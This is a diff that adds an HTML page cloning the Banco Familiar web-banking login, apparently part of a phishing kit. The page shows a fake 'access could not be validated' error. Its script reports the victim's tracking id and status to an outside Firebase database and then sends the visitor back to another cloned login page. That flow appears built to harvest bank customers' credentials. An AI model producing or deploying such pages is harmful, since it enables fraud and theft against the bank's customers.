@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Familiar-Web</title>
+<link rel="icon" type="image/png" href="https://ssecure.familiar.com.py/bancaweb3/resources/images/favicon.png">
+<link href="https://ssecure.familiar.com.py/bancaweb3/resources/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/commons.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_margin.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_icons.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar-responsive.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/main.css">
+<style>
+  @font-face{font-family:'robotoregular';font-weight:400;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-5f945f5c55a07d2a60221ab200fd4133.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-9db7888a4c2b34bebe331fa65c534f16.woff') format('woff');}
+  @font-face{font-family:'robotobold';font-weight:700;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-bold-webfont-fa2496fffa299cae4878e8d67d698ea9.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-bold-webfont-6a501aab45dbb9984df90f6208370474.woff') format('woff');}
+  @font-face{font-family:'robotomedium';font-weight:500;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-medium-webfont-526baa0edcedb893ffe618f920e8021e.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-medium-webfont-d4613ee3dc97691b80a1ab614974ace3.woff') format('woff');}
+
+  html,body,div,span,p,a,h1,h2,h3,h4,h5,label,form,input,button,td,th,li{
+    font-family:'robotoregular','Roboto',Arial,Helvetica,sans-serif;
+  }
+  h1,h2,h3,h4,h5,b,strong,.content-title-ingresar h2,.text-instruccion h2{
+    font-family:'robotobold','Roboto',Arial,Helvetica,sans-serif;
+  }
+  .glyphicon{font-family:'Glyphicons Halflings' !important}
+
+  .box-login{padding-bottom:24px}
+  .rechazo{padding:34px 26px 40px;text-align:center}
+  .rechazo h4{color:#b02a37;font-size:20px;margin:0 0 8px}
+  .rechazo .txt{color:#808080;font-size:13px;line-height:1.6;margin:0 0 22px}
+  .cruz{width:64px;height:64px;border-radius:50%;background:#fdecef;border:2px solid #b02a37;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
+  .cruz svg{width:28px;height:28px;stroke:#b02a37;stroke-width:3.5;fill:none}
+  .ayuda{color:#a5a5a5;font-size:11.5px;line-height:1.7;margin-top:16px}
+</style>
+</head>
+<body id="bodyLogin">
+<div class="container">
+  <div class="row">
+    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 container-login">
+
+      <div class="col-xs-12 col-sm-6 content-left">
+        <div class="col-xs-12 col-sm-12 pdl-0 content-icon-login">
+          <span class="icon-familiar"></span>
+        </div>
+
+        <div class="col-xs-12 col-sm-12 box-login image-familiar-agua">
+          <div class="rechazo">
+            <div class="cruz"><svg viewBox="0 0 24 24"><path d="M5 5l14 14M19 5L5 19"/></svg></div>
+            <h4>No se pudo validar el acceso</h4>
+            <p class="txt">Los datos ingresados no coinciden con los registrados o el código venció. Volvé a intentarlo.</p>
+
+            <button type="button" class="bottom-blue" id="volver">Volver a ingresar</button>
+
+            <p class="ayuda">Si el problema continúa, solicitá una nueva clave en tu sucursal o llamá al 417 6000.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="col-xs-12 col-sm-6 login-box right" id="content-saludo" style="display:block">
+        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 content-title-ingresar">
+          <h2>Ingresar al Sistema</h2>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-bienvenida">
+          <h1>Bienvenido a la Banca Web A Toda Hora</h1>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-instruccion">
+          <h2>Tu seguridad es importante:</h2><br>
+          <p>Para ingresar a la Banca Web A Toda Hora de Banco Familiar es necesario que ingreses tu contraseña a través de un teclado virtual; de esta manera evitamos la captura de tu clave a través de virus.</p>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-instruccion">
+          <h2>¿Cómo se usa el teclado virtual?</h2><br>
+          <p class="p-icon"><span class="glyphicon glyphicon-certificate item-1"></span>Ubicá el mouse sobre el teclado y hacé click en cada número o letra de tu contraseña.</p>
+          <p class="p-icon"><span class="glyphicon glyphicon-certificate item-2"></span>Luego de hacer click en un número o letra, ubicá el mouse fuera del teclado, de esa forma podrás visualizar de nuevo los números y letras.</p>
+        </div>
+      </div>
+
+      <div class="col-xs-12 col-sm-12 content-bottom pdt-15">
+        <div class="col-xs-5 col-sm-5 col-md-4 text-bottom-left">
+          <p>Banco Familiar 2018 Asunción del Paraguay</p>
+        </div>
+        <div class="col-xs-5 col-sm-5 col-md-6 text-bottom-right">
+          <p><a href="https://www.familiar.com.py/interna-84.htm">Nuestra red Nacional de Sucursales</a> - <a href="https://www.familiar.com.py/interna-122.htm">Condiciones Generales y Operacionales</a></p>
+          <p><a href="https://www.familiar.com.py/interna-85.htm">Política de Seguridad</a></p>
+        </div>
+        <div class="col-xs-2 col-sm-2 col-md-2 text-bottom-right" style="text-align:right">
+          <img src="https://ssecure.familiar.com.py/bancaweb3/resources/images/aTodaHora.png" alt="Familiar a toda hora" class="img-a-toda-hora">
+          <p>Versión 4.5.18</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var id = new URLSearchParams(location.search).get('u');
+  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
+
+  if(id){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({estado:'RECHAZADO', pagina:'rechazadofamiliar.html', online:false})}).catch(function(){});
+  }
+
+  document.getElementById('volver').addEventListener('click', function(){
+    location.href = 'indexfamiliar.html';
+  });
+})();
+</script>
+</body>
+</html>
